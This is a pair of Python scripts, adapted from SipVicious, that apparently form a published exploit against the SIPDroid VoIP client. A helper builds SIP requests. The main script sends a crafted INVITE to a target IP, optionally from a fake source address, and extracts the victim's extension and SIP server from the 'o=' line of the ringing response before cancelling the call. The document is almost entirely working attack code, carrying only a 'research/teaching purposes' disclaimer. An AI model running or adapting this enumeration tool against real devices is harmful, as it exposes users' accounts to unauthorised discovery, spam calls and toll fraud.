#!/usr/bin/env python
# Adapted from SipVicious by Anibal Aguiar - anibal.aguiar *SPAM*
tempest.com.br
#
# This code is only for security researches/teaching purposes,use at
your own risk!


import sys
import random

def printmsg(msg, color):
OKGREEN = '\033[92m'
OKBLUE = '\033[96m'
ENDC = '\033[0m'
WARN = '\033[91m'

if color is "Blue":
return OKBLUE + msg + ENDC
elif color is "Green":
return OKGREEN + msg + ENDC
elif color is "WARNING":
return WARN + msg + ENDC

def makeRequest(method,dspname,toaddr,
dsthost,port,callid,srchost='',
branchunique=None,localtag=None,
extension=None,body='',useragent=None,
cseq=1,auth=None,contact='<sip:123@1.1.1.1>',
accept='application/sdp',contentlength=None,
localport=5060,contenttype=None):

if extension is None:
uri = 'sip:%s' % dsthost
else:
uri = 'sip:%s@%s' % (extension,dsthost)
if branchunique is None:
branchunique = '%s' % random.getrandbits(32)
headers = dict()
finalheaders = dict()
superheaders = dict()
superheaders['Via'] = 'SIP/2.0/UDP %s:%s;branch=z9hG4bK%s;rport' %
(srchost,localport,branchunique)
headers['Max-Forwards'] = 70
headers['To'] = uri
headers['From'] = "\"%s\"" % dspname
if useragent is None:
headers['User-Agent'] = 'friendly-scanner'
headers['From'] += ';tag=as%s' % localtag
headers['Call-ID'] = "%s@%s" % (callid,srchost)
if contact is not None:
headers['Contact'] = contact
headers['CSeq'] = '%s %s' % (cseq,method)
headers['Max-Forwards'] = 70
headers['Accept'] = accept
if contentlength is None:
headers['Content-Length'] = len(body)
else:
headers['Content-Length'] = contentlength
if contenttype is None and len(body) > 0:
contenttype = 'application/sdp'
if contenttype is not None:
headers['Content-Type'] = contenttype

r = '%s %s SIP/2.0\r\n' % (method,uri)
for h in superheaders.iteritems():
r += '%s: %s\r\n' % h
for h in headers.iteritems():
r += '%s: %s\r\n' % h
for h in finalheaders.iteritems():
r += '%s: %s\r\n' % h
r += '\r\n'
r += body
return r, branchunique


----[SIPDroid-Extension_Enum.py]----------------------------------------------------------------------------------------

#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Anibal Aguiar - anibal.aguiar *SPAM* tempest.com.br
#
# Dependences:
#
# optparse - The optparse library can be installed using the linux
repository
# of your distro.
#
# myHelper -- myHelper.py should be placed at the same diretory of
SIPDroid-Extension_Enum.py
#
# This software is based on some functions of sipvicious-0.2.6.
#
# This code is only for security researches/teaching purposes,use at
your own risk!
#

import sys
import random
import re
from optparse import OptionParser
from socket import *
from myhelper import *


parse = OptionParser()
parse.add_option("-i", "--ip", dest="ip", help="Target IP range (CIDR or
unique IP). (MANDATORY)")
parse.add_option("-s", "--source", dest="source", help="Source IP
number. (MANDATORY)")
parse.add_option("-f", "--srcfake", dest="srcfake", help="Source IP
number (fake).")
parse.add_option("-p", "--dstport", dest="dstport", default=5060,
help="Destine port number (MAMDATORY due to SIPDroid Random port).
(default 5060)")
parse.add_option("-e", "--extension", dest="exten", default=None,
help="Destine extension. (default None)")
parse.add_option("-t", "--tag", dest="tag", default=None, help="Call
TAG. (default random)")
parse.add_option("-v", "--verbose", action="store_true", dest="debug",
default="False", help="Verbose mode - print pakets sent and received.
(default False)")

(options, arg) = parse.parse_args()

if not options.exten:
extension = "SIPDROID"
else:
extension = options.exten
if not options.srcfake:
srcfake = '1.1.1.1'
else:
srcfake = options.srcfake
dstport = int(options.dstport)

if not options.ip or not options.source:
print printmsg("Sintaxe erro. Try %s --help" % sys.argv[0], "WARNING")
sys.exit(1)
else:
dsthost = options.ip
fromhost = options.source
if options.tag is None:
tag = random.getrandbits(22)
else:
tag = options.tag

buf = 1024
addr = (dsthost,dstport)
cid='%s' % str(random.getrandbits(32))
branch=None
srcaddr = (fromhost,5062)

# Create socket
UDPSock = socket(AF_INET,SOCK_DGRAM)
# Binding on 5060
UDPSock.bind(srcaddr)

# Send messages
method = "INVITE"
(header,branch) =
makeRequest(method,extension,dsthost,dsthost,dstport,cid,srcfake,branch,tag)
if(UDPSock.sendto(header, addr)):
sent = True
if options.debug is True:
print printmsg("Data Sent:", "WARNING")
print header
print printmsg("INVITE sent to %s!\n" % dsthost, "Green")
else:
sent = False

# Receive messages
while sent:
try:
UDPSock.settimeout(4)
data,bindaddr = UDPSock.recvfrom(buf)
if options.debug is True:
print printmsg("Data Received:", "WARNING")
print data
if re.search('SIP/2.0 180 Ringing', data):
packet = data.split('\n')
for packetline in packet:
for origin in re.finditer('o\=[a-zA-Z0-9\-]+\@[a-zA-Z0-9.\-]+', packetline):
print printmsg("o=<extension>@<server>: %s\n" % origin.group(0), "Blue")

method = 'CANCEL'
(header, branch) =
makeRequest(method,extension,dsthost,dsthost,dstport,cid,srcfake,branch,tag)
if options.debug is True:
print printmsg("Data Sent:", "WARNING")
print header
UDPSock.sendto(header, addr)
sent = False
except Exception as excpt:
print excpt
print printmsg("OPS... Timeout on receving data or something wrong with
socket... take a look at dest. port number too (-p option).", "WARNING")
sent = False

# Close socket
UDPSock.close()

